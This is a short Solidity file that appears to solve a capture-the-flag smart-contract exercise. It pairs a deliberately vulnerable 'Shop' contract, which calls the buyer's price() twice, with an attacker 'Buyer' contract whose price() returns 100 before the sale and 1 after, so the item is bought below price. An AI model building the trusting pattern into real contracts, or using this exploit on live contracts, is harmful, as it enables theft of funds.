// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Buyer {

    Shop public shop;

    constructor(address _shop){
        shop = Shop(_shop);
    }
    
    
    // we are abusing the fact that the "Shop" contract is calling our function twice.
    
    function price() external view returns (uint){
        if(shop.isSold() == false){
            return 100;
        }
        
        return 1;
    }

    function callBuy() public {
        shop.buy();
    }

}
